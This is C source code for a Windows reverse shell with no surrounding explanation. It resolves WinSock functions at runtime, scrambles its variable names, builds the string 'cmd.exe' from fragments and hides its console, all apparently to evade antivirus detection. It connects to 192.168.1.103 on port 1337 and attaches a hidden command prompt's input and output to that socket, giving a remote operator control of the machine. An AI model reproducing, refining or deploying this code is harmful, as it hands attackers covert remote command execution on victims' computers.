#include <stdio.h>
#include <windows.h>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>

typedef int (WSAAPI *lpfnWSAStartup)(WORD wVersionRequired, LPWSADATA lpWSAData);
typedef int (WSAAPI *lpfnWSACleanup)(void);
typedef SOCKET (WSAAPI *lpfnWSASocket)(int af, int type, int protocol, LPWSAPROTOCOL_INFO lpProtocolInfo, GROUP g, DWORD dwFlags);
typedef int (WSAAPI *lpfnWSAConnect)(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);
typedef int (WSAAPI *lpfnRecv)(SOCKET s, char *buf, int len, int flags);

#pragma comment(lib, "user32.lib")

int main(int argc, char* argv[]) {
    FreeConsole();
    HMODULE hwww = LoadLibrary("ws2_32.dll");
    if (hwww == NULL) {
        printf("Could not load ws2_32.dll\n");
        return 1;
    }

    lpfnWSAStartup uywueftuwefwuuw = (lpfnWSAStartup)GetProcAddress(hwww, "WSAStartup");
    lpfnWSACleanup ploskdmcnc = (lpfnWSACleanup)GetProcAddress(hwww, "WSACleanup");
    lpfnWSASocket yncsj = (lpfnWSASocket)GetProcAddress(hwww, "WSASocketW");
    lpfnWSAConnect llllosksuua = (lpfnWSAConnect)GetProcAddress(hwww, "WSAConnect");
    lpfnRecv ujvjcmvcmvcmmcjyhn = (lpfnRecv)GetProcAddress(hwww, "recv");

    if (!uywueftuwefwuuw || !ploskdmcnc || !yncsj || !llllosksuua || !ujvjcmvcmvcmmcjyhn) {
        printf("Could not get function addresses\n");
        FreeLibrary(hwww);
        return 1;
    }

    SOCKET qqweretrwqcqqmmn;
    STARTUPINFO siosusg;
    PROCESS_INFORMATION iloksj;
    BOOL sbdsksck;
    int lthnbvmdl;
    struct sockaddr_in Inksjshsfww;
    char rdda[] = "192.168.1.103";
    char awqszxa[4096];
    int tt = 1337;

    WSADATA ietuwecwtuecwucuwaa;
    uywueftuwefwuuw(MAKEWORD(2, 2), &ietuwecwtuecwucuwaa); // Initialize WinSock
    qqweretrwqcqqmmn = yncsj(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // Create a TCP socket
    Inksjshsfww.sin_port = htons(tt);
    Inksjshsfww.sin_family = AF_INET;
    Inksjshsfww.sin_addr.s_addr = inet_addr(rdda);

    lthnbvmdl = llllosksuua(qqweretrwqcqqmmn, (SOCKADDR*)&Inksjshsfww, sizeof(Inksjshsfww), NULL, NULL, NULL, NULL); // Connect to the target server
    if (lthnbvmdl == SOCKET_ERROR) {
        printf("Connection Error to the server: %lu\n", WSAGetLastError());
        ploskdmcnc();
        FreeLibrary(hwww);
        return 1;
    }
    
    ujvjcmvcmvcmmcjyhn(qqweretrwqcqqmmn, awqszxa, sizeof(awqszxa), 0); // Correct function call
    for (int i = 0; i < sizeof(siosusg); i++) {
        ((char*)&siosusg)[i] ^= ((char*)&siosusg)[i];
    } 
    siosusg.cb = sizeof(siosusg);
    siosusg.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    siosusg.hStdInput = siosusg.hStdOutput = siosusg.hStdError = (HANDLE)qqweretrwqcqqmmn; // pipe std error/output/input

    char b[3] = "cm";
    char c[4] = "d.e";
    char d[2] = "x";
    char e[2] = "e";
    char sdj[10];
    sdj[0] = '\0'; 

    strcat(sdj, b); 
    strcat(sdj, c); 
    strcat(sdj, d);
    strcat(sdj, e);

    sbdsksck = CreateProcess(NULL, sdj, NULL, NULL, TRUE, CREATE_NO_WINDOW | IDLE_PRIORITY_CLASS, NULL, NULL, &siosusg, &iloksj); // Spawn Command Prompt
    if (!sbdsksck){
        printf("Cannot create a thread\n");
        printf("Error is:%lu\n", GetLastError());
    }
    WaitForSingleObject(iloksj.hProcess, INFINITE);

    CloseHandle(iloksj.hThread);
    CloseHandle(iloksj.hProcess);

    memset(awqszxa, 0, sizeof(awqszxa));

    ploskdmcnc();
    FreeLibrary(hwww);

    return 0;
}
